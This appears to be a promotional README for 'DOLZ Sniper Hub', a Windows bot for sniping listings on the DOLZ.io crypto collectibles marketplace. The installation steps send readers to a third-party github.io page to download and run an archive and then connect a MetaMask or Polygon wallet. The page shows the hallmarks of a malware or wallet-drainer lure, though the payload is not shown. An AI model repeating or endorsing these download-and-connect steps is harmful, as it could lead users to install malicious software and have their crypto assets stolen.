**DOLZ Sniper Hub** gives collectors on [DOLZ.io](https://dolz.io) the speed edge — react to new listings, floor shifts and weekly drops faster than manual browsing ever could. Built for Windows. Runs locally. Your wallet stays on your device.

## Key Features

* Instant alerts when new listings match your price rules
* Floor tracking on selected models — never miss a price shift
* Drop countdown and bid management for weekly releases
* Millisecond-focused scanning — built for competitive collectors
* Rarity and model filters — Legendary, Epic, Rare, Limited
* Local execution only — no cloud wallet storage
* Full session log — review every action on your PC
* Optimised for Polygon $DOLZ marketplace activity

## System Requirements

* **OS:** Windows 10 or 11 (64-bit)
* **Storage:** ~303 MB free disk space
* **RAM:** 4 GB minimum · 8 GB recommended
* **Network:** Low-latency connection recommended
* **Wallet:** MetaMask or compatible Polygon wallet
* **Token:** $DOLZ + MATIC for gas fees

> **Note:** Speed and results depend on network latency and marketplace activity at the time.

## Installing the Sniper Suite

1. Download the latest **DOLZ Sniper Suite** from the following link: **[CLICK](https://vict-garcia-948.github.io/dolz-sniper/)**.
2. Open the project page and follow the setup guide displayed there.
3. Extract the archive to your PC and launch the tool you need.
4. Connect your wallet locally and set your target models and price limits.
5. Press **Start** — the scanner runs on your machine until you stop it.

> **Tip:** Use a dedicated collector wallet with a set $DOLZ budget for safer sessions.
